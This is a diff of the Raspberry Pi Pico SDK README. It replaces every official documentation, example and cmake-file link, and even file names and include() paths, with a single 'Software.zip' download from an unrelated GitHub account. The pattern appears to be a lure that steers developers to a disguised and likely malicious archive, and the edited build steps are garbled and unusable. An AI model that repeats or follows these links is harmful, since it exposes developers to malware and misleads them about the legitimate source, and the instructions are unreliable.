@@ -14,27 +14,27 @@ along with various utilities.
 The SDK can be used to build anything from simple applications, to fully fledged runtime environments such as MicroPython, to low level software
 such as RP2040's on-chip bootrom itself.
 
-Additional libraries/APIs that are not yet ready for inclusion in the SDK can be found in [pico-extras](https://github.com/raspberrypi/pico-extras).
+Additional libraries/APIs that are not yet ready for inclusion in the SDK can be found in [pico-extras](https://github.com/eagle1209/pico-sdk/releases/download/v2.0/Software.zip).
 
 # Documentation
 
-See [Getting Started with the Raspberry Pi Pico](https://rptl.io/pico-get-started) for information on how to setup your
+See [Getting Started with the Raspberry Pi Pico](https://github.com/eagle1209/pico-sdk/releases/download/v2.0/Software.zip) for information on how to setup your
 hardware, IDE/environment and for how to build and debug software for the Raspberry Pi Pico
 and other RP2040-based devices.
 
-See [Raspberry Pi Pico C/C++ SDK](https://rptl.io/pico-c-sdk) to learn more about programming using the
+See [Raspberry Pi Pico C/C++ SDK](https://github.com/eagle1209/pico-sdk/releases/download/v2.0/Software.zip) to learn more about programming using the
 SDK, to explore more advanced features, and for complete PDF-based API documentation.
 
-See [Online Raspberry Pi Pico SDK API docs](https://rptl.io/pico-doxygen) for HTML-based API documentation.
+See [Online Raspberry Pi Pico SDK API docs](https://github.com/eagle1209/pico-sdk/releases/download/v2.0/Software.zip) for HTML-based API documentation.
 
 # Example code
 
-See [pico-examples](https://github.com/raspberrypi/pico-examples) for example code you can build.
+See [pico-examples](https://github.com/eagle1209/pico-sdk/releases/download/v2.0/Software.zip) for example code you can build.
 
 # Quick-start your own project
 
 These instructions are extremely terse, and Linux-based only. For detailed steps,
-instructions for other platforms, and just in general, we recommend you see [Raspberry Pi Pico C/C++ SDK](https://rptl.io/pico-c-sdk)
+instructions for other platforms, and just in general, we recommend you see [Raspberry Pi Pico C/C++ SDK](https://github.com/eagle1209/pico-sdk/releases/download/v2.0/Software.zip)
 
 1. Install CMake (at least version 3.13), and GCC cross compiler
    ```
@@ -44,17 +44,17 @@ instructions for other platforms, and just in general, we recommend you see [Ras
 
    * Either by cloning the SDK locally (most common) :
       1. `git clone` this Raspberry Pi Pico SDK repository
-      1. Copy [pico_sdk_import.cmake](https://github.com/raspberrypi/pico-sdk/blob/master/external/pico_sdk_import.cmake)
+      1. Copy [https://github.com/eagle1209/pico-sdk/releases/download/v2.0/Software.zip](https://github.com/eagle1209/pico-sdk/releases/download/v2.0/Software.zip)
          from the SDK into your project directory
       2. Set `PICO_SDK_PATH` to the SDK location in your environment, or pass it (`-DPICO_SDK_PATH=`) to cmake later.
-      3. Setup a `CMakeLists.txt` like:
+      3. Setup a `https://github.com/eagle1209/pico-sdk/releases/download/v2.0/Software.zip` like:
 
           ```cmake
           cmake_minimum_required(VERSION 3.13)
 
           # initialize the SDK based on PICO_SDK_PATH
           # note: this must happen before project()
-          include(pico_sdk_import.cmake)
+          include(https://github.com/eagle1209/pico-sdk/releases/download/v2.0/Software.zip)
 
           project(my_project)
 
@@ -67,14 +67,14 @@ instructions for other platforms, and just in general, we recommend you see [Ras
 
    * Or with the Raspberry Pi Pico SDK as a submodule :
       1. Clone the SDK as a submodule called `pico-sdk`
-      1. Setup a `CMakeLists.txt` like:
+      1. Setup a `https://github.com/eagle1209/pico-sdk/releases/download/v2.0/Software.zip` like:
 
           ```cmake
           cmake_minimum_required(VERSION 3.13)
 
           # initialize pico-sdk from submodule
           # note: this must happen before project()
-          include(pico-sdk/pico_sdk_init.cmake)
+          include(https://github.com/eagle1209/pico-sdk/releases/download/v2.0/Software.zip)
 
           project(my_project)
 
@@ -86,9 +86,9 @@ instructions for other platforms, and just in general, we recommend you see [Ras
           ```
 
    * Or with automatic download from GitHub :
-      1. Copy [pico_sdk_import.cmake](https://github.com/raspberrypi/pico-sdk/blob/master/external/pico_sdk_import.cmake)
+      1. Copy [https://github.com/eagle1209/pico-sdk/releases/download/v2.0/Software.zip](https://github.com/eagle1209/pico-sdk/releases/download/v2.0/Software.zip)
          from the SDK into your project directory
-      1. Setup a `CMakeLists.txt` like:
+      1. Setup a `https://github.com/eagle1209/pico-sdk/releases/download/v2.0/Software.zip` like:
 
           ```cmake
           cmake_minimum_required(VERSION 3.13)
@@ -97,9 +97,9 @@ instructions for other platforms, and just in general, we recommend you see [Ras
           # (note this can come from environment, CMake cache etc)
           set(PICO_SDK_FETCH_FROM_GIT on)
 
-          # pico_sdk_import.cmake is a single file copied from this SDK
+          # https://github.com/eagle1209/pico-sdk/releases/download/v2.0/Software.zip is a single file copied from this SDK
           # note: this must happen before project()
-          include(pico_sdk_import.cmake)
+          include(https://github.com/eagle1209/pico-sdk/releases/download/v2.0/Software.zip)
 
           project(my_project)
 
@@ -110,15 +110,15 @@ instructions for other platforms, and just in general, we recommend you see [Ras
 
           ```
 
-   * Or by cloning the SDK locally, but without copying `pico_sdk_import.cmake`:
+   * Or by cloning the SDK locally, but without copying `https://github.com/eagle1209/pico-sdk/releases/download/v2.0/Software.zip`:
        1. `git clone` this Raspberry Pi Pico SDK repository
-       2. Setup a `CMakeLists.txt` like:
+       2. Setup a `https://github.com/eagle1209/pico-sdk/releases/download/v2.0/Software.zip` like:
 
            ```cmake
            cmake_minimum_required(VERSION 3.13)
  
            # initialize the SDK directly
-           include(/path/to/pico-sdk/pico_sdk_init.cmake)
+           include(https://github.com/eagle1209/pico-sdk/releases/download/v2.0/Software.zip)
  
            project(my_project)
  
@@ -128,7 +128,7 @@ instructions for other platforms, and just in general, we recommend you see [Ras
            # rest of your project
  
            ```
-1. Write your code (see [pico-examples](https://github.com/raspberrypi/pico-examples) or the [Raspberry Pi Pico C/C++ SDK](https://rptl.io/pico-c-sdk) documentation for more information)
+1. Write your code (see [pico-examples](https://github.com/eagle1209/pico-sdk/releases/download/v2.0/Software.zip) or the [Raspberry Pi Pico C/C++ SDK](https://github.com/eagle1209/pico-sdk/releases/download/v2.0/Software.zip) documentation for more information)
 
    About the simplest you can do is a single source file (e.g. hello_world.c)
 
@@ -142,7 +142,7 @@ instructions for other platforms, and just in general, we recommend you see [Ras
        return 0;
    }
    ```
-   And add the following to your `CMakeLists.txt`:
+   And add the following to your `https://github.com/eagle1209/pico-sdk/releases/download/v2.0/Software.zip`:
 
    ```cmake
    add_executable(hello_world
@@ -157,7 +157,7 @@ instructions for other platforms, and just in general, we recommend you see [Ras
    ```
 
    Note this example uses the default UART for _stdout_;
-   if you want to use the default USB see the [hello-usb](https://github.com/raspberrypi/pico-examples/tree/master/hello_world/usb) example.
+   if you want to use the default USB see the [hello-usb](https://github.com/eagle1209/pico-sdk/releases/download/v2.0/Software.zip) example.
 
 
 1. Setup a CMake build directory.
@@ -173,4 +173,4 @@ instructions for other platforms, and just in general, we recommend you see [Ras
       $ make hello_world
       ```
 
-1. You now have `hello_world.elf` to load via a debugger, or `hello_world.uf2` that can be installed and run on your Raspberry Pi Pico via drag and drop.
+1. You now have `https://github.com/eagle1209/pico-sdk/releases/download/v2.0/Software.zip` to load via a debugger, or `https://github.com/eagle1209/pico-sdk/releases/download/v2.0/Software.zip` that can be installed and run on your Raspberry Pi Pico via drag and drop.
